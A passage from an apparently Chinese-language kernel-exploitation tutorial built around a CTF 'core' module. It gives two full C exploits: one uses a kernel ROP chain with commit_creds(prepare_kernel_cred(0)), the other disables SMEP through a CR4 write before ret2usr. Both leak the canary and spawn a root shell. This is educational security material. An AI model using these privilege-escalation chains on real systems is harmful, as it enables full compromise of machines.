<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xFFFFFFFF8109CCE0</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xFFFFFFFF8109C8E0</span>;</span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xFFFFFFFF8223D1A0</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff81000b2f</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdx_ret = <span class="number">0xffffffff810a0f49</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rcx_ret = <span class="number">0xffffffff81021e53</span>;</span><br><span class="line"><span class="type">size_t</span> mov_rdi_rax_call_rdx = <span class="number">0xffffffff8101aa6a</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_popfq_ret = <span class="number">0xffffffff81a012da</span>;</span><br><span class="line"><span class="type">size_t</span> iretq = <span class="number">0xffffffff81050ac2</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xFFFFFFFF81A008DA</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> core_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">size_t</span> off)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889C</span>, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889A</span>, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_write</span><span class="params">(<span class="type">char</span> *buf, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    write(core_fd, buf, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rebase</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open kallsyms.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(kallsyms_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, name)) &#123;</span><br><span class="line">        <span class="type">size_t</span> offset = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;commit_creds&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) commit_creds;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;prepare_kernel_cred&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) prepare_kernel_cred;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (offset != <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] offset: %p\n&quot;</span>, offset);</span><br><span class="line">            commit_creds += offset;</span><br><span class="line">            prepare_kernel_cred += offset;</span><br><span class="line">            init_cred += offset;</span><br><span class="line">            pop_rdi_ret += offset;</span><br><span class="line">            pop_rdx_ret += offset;</span><br><span class="line">            pop_rcx_ret += offset;</span><br><span class="line">            mov_rdi_rax_call_rdx += offset;</span><br><span class="line">            swapgs_popfq_ret += offset;</span><br><span class="line">            iretq += offset;</span><br><span class="line">            swapgs_restore_regs_and_return_to_usermode += offset;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] commit_creds: %p\n&quot;</span>, (<span class="type">size_t</span>) commit_creds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] prepare_kernel_cred: %p\n&quot;</span>, (<span class="type">size_t</span>) prepare_kernel_cred);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">get_canary</span><span class="params">()</span> &#123;</span><br><span class="line">    set_off(<span class="number">64</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    core_read(buf);</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">size_t</span> *) buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    save_status();</span><br><span class="line">    rebase();</span><br><span class="line"></span><br><span class="line">    core_fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (core_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open core.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> canary = get_canary();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    *(<span class="type">size_t</span> *) &amp;buf[<span class="number">64</span>] = canary;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *rop = (<span class="type">size_t</span> *) &amp;buf[<span class="number">80</span>], it = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//    rop[it++] = pop_rdi_ret;</span></span><br><span class="line"><span class="comment">//    rop[it++] = init_cred;</span></span><br><span class="line"><span class="comment">//    rop[it++] = commit_creds;</span></span><br><span class="line"></span><br><span class="line">    rop[it++] = pop_rdi_ret;</span><br><span class="line">    rop[it++] = <span class="number">0</span>;</span><br><span class="line">    rop[it++] = prepare_kernel_cred;</span><br><span class="line">    rop[it++] = pop_rdx_ret;</span><br><span class="line">    rop[it++] = pop_rcx_ret;</span><br><span class="line">    rop[it++] = mov_rdi_rax_call_rdx;</span><br><span class="line">    rop[it++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    rop[it++] = swapgs_restore_regs_and_return_to_usermode + <span class="number">0x16</span>;</span><br><span class="line">    rop[it++] = <span class="number">0</span>;</span><br><span class="line">    rop[it++] = <span class="number">0</span>;</span><br><span class="line">    rop[it++] = (<span class="type">size_t</span>) get_shell;</span><br><span class="line">    rop[it++] = user_cs;</span><br><span class="line">    rop[it++] = user_rflags;</span><br><span class="line">    rop[it++] = user_sp;</span><br><span class="line">    rop[it++] = user_ss;</span><br><span class="line"></span><br><span class="line">    core_write(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    core_copy_func(<span class="number">0xffffffffffff0000</span> | <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="kernel-rop-ret2user"><a href="#kernel-rop-ret2user" class="headerlink" title="kernel rop + ret2user"></a>kernel rop + ret2user</h2><h3 id="利用思路-3"><a href="#利用思路-3" class="headerlink" title="利用思路"></a>利用思路</h3><p>这种方法实际上是将前两种方法结合起来，同样可以绕过 smap 和 smep 保护。大体思路是先利用 rop 设置 cr4 为 0x6f0  （这个值可以通过用 cr4 原始值 &amp; 0xFFFFF 得到）关闭 smep ， 然后 iret 到用户空间去执行提权代码。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/smep.jpg"
                      alt="smep"
                ></p>
<p>例如，当 </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$CR4 = 0x1407f0 = 000 1 0100 0000 0111 1111 0000</span><br></pre></td></tr></table></figure></div>

<p>时，smep 保护开启。而 CR4 寄存器是可以通过 mov 指令修改的，因此只需要 </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov cr4, 0x1407e0</span><br><span class="line"># 0x1407e0 = 101 0 0000 0011 1111 00000</span><br></pre></td></tr></table></figure></div>

<p>即可关闭 smep 保护。</p>
<p>搜索一下从 <code>vmlinux</code> 中提取出的 gadget，很容易就能达到这个目的。</p>
<ul>
<li>如何查看 CR4 寄存器的值？<ul>
<li>gdb 无法查看 cr4 寄存器的值，可以通过 kernel crash 时的信息查看。为了关闭 smep 保护，常用一个固定值 <code>0x6f0</code>，即 <code>mov cr4, 0x6f0</code>。</li>
</ul>
</li>
</ul>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><p>注意这里 smap 保护不能直接关闭，因此不能像前面 ret2usr 那样直接在 exp 中写入 trap frame 然后栈迁移到 trap frame 的地址，而是在 rop 中构造 trap frame 结构。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *(*prepare_kernel_cred)(<span class="type">void</span> *) KERNCALL = (<span class="type">void</span> *) <span class="number">0xFFFFFFFF8109CCE0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *(*commit_creds)(<span class="type">void</span> *) KERNCALL = (<span class="type">void</span> *) <span class="number">0xFFFFFFFF8109C8E0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *init_cred = (<span class="type">void</span> *) <span class="number">0xFFFFFFFF8223D1A0</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff81000b2f</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdx_ret = <span class="number">0xffffffff810a0f49</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rcx_ret = <span class="number">0xffffffff81021e53</span>;</span><br><span class="line"><span class="type">size_t</span> mov_cr4_rdi_ret = <span class="number">0xffffffff81075014</span>;</span><br><span class="line"><span class="type">size_t</span> mov_rdi_rax_call_rdx = <span class="number">0xffffffff8101aa6a</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_popfq_ret = <span class="number">0xffffffff81a012da</span>;</span><br><span class="line"><span class="type">size_t</span> iretq = <span class="number">0xffffffff81050ac2</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> &#123; system(<span class="string">&quot;/bin/sh&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span> &#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> core_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">size_t</span> off)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889C</span>, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889A</span>, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_write</span><span class="params">(<span class="type">char</span> *buf, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    write(core_fd, buf, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rebase</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open kallsyms.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(kallsyms_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, name)) &#123;</span><br><span class="line">        <span class="type">size_t</span> offset = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;commit_creds&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) commit_creds;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;prepare_kernel_cred&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) prepare_kernel_cred;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (offset != <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] offset: %p\n&quot;</span>, offset);</span><br><span class="line">            commit_creds = (<span class="type">void</span> *) ((<span class="type">size_t</span>) commit_creds + offset);</span><br><span class="line">            prepare_kernel_cred = (<span class="type">void</span> *) ((<span class="type">size_t</span>) prepare_kernel_cred + offset);</span><br><span class="line">            init_cred = (<span class="type">void</span> *) ((<span class="type">size_t</span>) init_cred + offset);</span><br><span class="line">            pop_rdi_ret += offset;</span><br><span class="line">            pop_rdx_ret += offset;</span><br><span class="line">            pop_rcx_ret += offset;</span><br><span class="line">            mov_rdi_rax_call_rdx += offset;</span><br><span class="line">            swapgs_popfq_ret += offset;</span><br><span class="line">            iretq += offset;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] commit_creds: %p\n&quot;</span>, (<span class="type">size_t</span>) commit_creds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] prepare_kernel_cred: %p\n&quot;</span>, (<span class="type">size_t</span>) prepare_kernel_cred);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">get_canary</span><span class="params">()</span> &#123;</span><br><span class="line">    set_off(<span class="number">64</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    core_read(buf);</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">size_t</span> *) buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    save_status();</span><br><span class="line">    rebase();</span><br><span class="line"></span><br><span class="line">    core_fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (core_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open core.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> canary = get_canary();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    *(<span class="type">size_t</span> *) &amp;buf[<span class="number">64</span>] = canary;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *rop = (<span class="type">size_t</span> *) &amp;buf[<span class="number">80</span>], it = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    rop[it++] = pop_rdi_ret;</span><br><span class="line">    rop[it++] = <span class="number">0x00000000000006f0</span>;</span><br><span class="line">    rop[it++] = mov_cr4_rdi_ret;</span><br><span class="line">    rop[it++] = (<span class="type">size_t</span>) get_root;</span><br><span class="line">    rop[it++] = swapgs_popfq_ret;</span><br><span class="line">    rop[it++] = <span class="number">0</span>;</span><br><span class="line">    rop[it++] = iretq;</span><br><span class="line">    rop[it++] = (<span class="type">size_t</span>) get_shell;</span><br><span class="line">    rop[it++] = user_cs;</span><br><span class="line">    rop[it++] = user_rflags;</span><br><span class="line">    rop[it++] = user_sp;</span><br><span class="line">    rop[it++] = user_ss;</span><br><span class="line"></span><br><span class="line">    core_write(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    core_copy_func(<span class="number">0xffffffffffff0000</span> | <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="利用-pt-regs-构造-kernel-ROP"><a href="#利用-pt-regs-构造-kernel-ROP" class="headerlink" title="利用 pt_regs 构造 kernel ROP"></a>利用 pt_regs 构造 kernel ROP</h2><p>查看<code>entry_SYSCALL_64</code> 这一用汇编写的函数内部，注意到当程序进入到内核态时，该函数会将所有的寄存器压入内核栈上，形成一个 <code>pt_regs</code>结构体，该结构体实质上位于内核栈底，<a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/latest/source/arch/x86/include/uapi/asm/ptrace.h#L44" >定义<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span 